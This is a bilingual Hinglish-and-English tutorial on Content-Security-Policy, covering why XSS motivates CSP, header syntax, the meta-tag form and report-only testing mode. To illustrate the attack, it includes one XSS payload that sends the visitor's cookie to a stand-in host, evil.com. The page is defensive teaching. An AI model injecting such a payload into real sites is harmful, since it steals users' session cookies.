Content-Security-Policy (CSP) ko basics se samjho Understand Content-Security-Policy (CSP) from the basics

Ek problem se shuru karte hain — kyunki CSP koi random feature nahi hai, yeh ek specific problem solve karne ke liye banaya gaya tha. Let's start with a problem — because CSP isn't a random feature, it was designed to solve a very specific problem.

⚠ Problem⚠ Problem

Socho ek website hai — login form hai, comment section hai, search bar hai. Sab kuch normal chal raha hai.Imagine a website — it has a login form, a comment section, a search bar. Everything works normally.

Ek din, ek attacker comment box mein yeh type karta hai:One day, an attacker types this into the comment box:

<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

Website is comment ko bina check kiye directly page pe show kar deta hai. Ab jo bhi is comment ko dekhta hai, uska browser yeh script chala deta hai — aur uska cookie chupke se attacker ke server pe chala jaata hai. Isko XSS (Cross-Site Scripting) kehte hain — attacker victim ke browser mein apna script "inject" kar deta hai.The website displays this comment directly on the page without validating it. Now, whoever views this comment, their browser executes this script — and their cookie is silently sent to the attacker's server. This is called XSS (Cross-Site Scripting) — the attacker "injects" their script into the victim's browser.

Developer input validation karta hai, kuch characters filter karta hai — phir bhi naye bypass milte rehte hain, kyunki HTML aur JavaScript itne flexible hain ki har tarah ka encoding/obfuscation try kiya ja sakta hai.The developer adds input validation and filters some characters — yet new bypasses keep emerging, because HTML and JavaScript are so flexible that any kind of encoding/obfuscation can be tried.

Asli problem yeh hai: BROWSER ko yeh pata hi nahi hota ki konsa script "legitimate developer ka" hai aur konsa "attacker ne inject kiya hai" — dono ek jaise dikhte hain, browser dono ko equally trust karke chala deta hai.The real problem is: The BROWSER has no idea which script belongs to the "legitimate developer" and which was "injected by an attacker" — both look exactly the same, and the browser trusts and executes both equally.

✓ Solution✓ Solution

Isi problem ko solve karne ke liye CSP (Content Security Policy) banaya gaya — ek naya idea: "Filter karne ki koshish chhodo, seedha SERVER browser ko bata de ki sirf KAUN SE sources se script/style/image allowed hain — baaki sab, chahe kitna bhi clever payload ho, browser khud hi block kar dega."To solve this exact problem, CSP (Content Security Policy) was invented — a new approach: "Stop trying to filter everything. Instead, have the SERVER directly tell the browser EXACTLY WHICH sources are allowed for scripts/styles/images — everything else, no matter how clever the payload, the browser will block automatically."

Matlab: chahe attacker apna script kitni bhi cleverly inject kar de, agar uska SOURCE (kahan se aaya) CSP ki allowed list mein nahi hai — browser use chalayega hi nahi. Filtering ki jagah ab ALLOWLISTING ho gayi.Meaning: no matter how cleverly an attacker injects their script, if its SOURCE is not in the CSP allowlist — the browser simply won't execute it. Filtering has been replaced by ALLOWLISTING.

Step 01Step 01

CSP hai kya, bilkul basic seWhat is CSP, from the absolute basics

Content-Security-Policy (CSP) ek HTTP RESPONSE header hai jo server browser ko bhejta hai. Yeh header browser ko explicitly batata hai ki page ke liye scripts, styles, images, fonts, frames aur baaki resources kahan se load ya execute karna allowed hai. Content-Security-Policy (CSP) is an HTTP RESPONSE header sent by the server to the browser. This header explicitly tells the browser from where it is allowed to load or execute scripts, styles, images, fonts, frames, and other resources for the page.

Jab bhi browser koi naya resource load karne ki koshish karta hai, wo pehle is CSP policy ko check karta hai. Agar resource ka source CSP ki allowed list (whitelist) mein maujood hai, toh browser use load kar lega. Agar wo source allowed list mein nahi hai, toh browser usse block kar dega aur console mein violation error show karega. Is policy ko strictly browser enforce karta hai, jisse unauthorized ya malicious scripts (jaise XSS) execute nahi ho paati. Whenever the browser attempts to load a new resource, it first checks this CSP policy. If the resource's source is present in the CSP allowlist (whitelist), the browser will load it. If the source is not in the allowlist, the browser will block it and show a violation error in the console. This policy is strictly enforced by the browser, preventing unauthorized or malicious scripts (like XSS) from executing.

Step 02Step 02

CSP likhte kaise hain — SyntaxHow to write CSP — Syntax

CSP ko HTTP response header ki tarah bhejte hain. Ek example dekhte hain, fir usse todke samajhte hain. CSP is sent as an HTTP response header. Let's look at an example, then break it down to understand it.

Example HeaderExample Header 
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'; object-src 'none';
Content-Security-Policy:Header ka naam — server response mein yeh key bhejta hai.Header name — the server sends this key in the response.
default-src, script-src...Yeh directives hain — har directive ek TYPE ke resource ko control karta hai (kaunsa resource kahan se load ho sakta hai).These are directives — each directive controls a TYPE of resource (where that resource can be loaded from).
'self' https://cdn...Har directive ke baad SPACE-separated list hoti hai allowed sources ki.After each directive, there is a SPACE-separated list of allowed sources.
;Semicolon se ek directive khatam hoke agla directive shuru hota hai. Multiple directives ek hi header mein combine ho jaate hain.A semicolon ends one directive and starts the next. Multiple directives are combined in a single header this way.
📄
Alternative — Meta TagAlternative — Meta Tag

Agar server headers control nahi kar sakte (jaise shared hosting), to HTML ke andar meta tag se bhi CSP laga sakte ho: If you can't control server headers (like in shared hosting), you can also apply CSP using a meta tag inside the HTML: 

<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
⚠ Limitation:⚠ Limitation: frame-ancestors, report-uri/report-to, aur sandbox directives sirf REAL HTTP header se kaam karte hain — meta tag se yeh kaam nahi karte, browser inhe ignore kar dega. frame-ancestors, report-uri/report-to, and sandbox directives only work via REAL HTTP headers — they do not work via meta tags; the browser will ignore them.
Testing Mode — Report OnlyTesting Mode — Report Only 
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report

Yeh header naam mein "-Report-Only" hai — matlab yeh kuch bhi BLOCK nahi karta, sirf VIOLATIONS ko specified URL pe report karta hai. Production mein CSP enforce karne se pehle isse TEST karna best practice hai, taaki pata chale policy se koi legitimate cheez to nahi toot rahi. This header has "-Report-Only" in its name — meaning it doesn't BLOCK anything, it only reports VIOLATIONS to the specified URL. It's best practice to TEST with this before enforcing CSP in production, to ensure the policy doesn't break legitimate features.

CSP Directives — "Attributes" jo aap set karte hoCSP Directives — The "Attributes" you set

Yeh hi CSP ke asli "attributes" hain jo aapne poochhe the. Har directive ek specific TYPE ke resource ko control karta hai. Inhe 4 categories mein group kiya gaya hai — yeh official grouping hai, random nahi. These are the actual "attributes" of CSP you asked about. Each directive controls a specific TYPE of resource. They are grouped into 4 categories — this is the official grouping, not random.

Step 04Step 04

Source Values — Directive ke andar kya likhte hainSource Values — What to write inside a directive

Har directive (jaise script-src) ke baad ek VALUE likhte hain — yeh batata hai "kis se" allow karna hai. Yeh values bhi CSP ke attributes hi hain, bas yeh directive ke andar jaate hain. After every directive (like script-src), we write a VALUE — this dictates "from where" to allow. These values are also CSP attributes, they just go inside the directive.
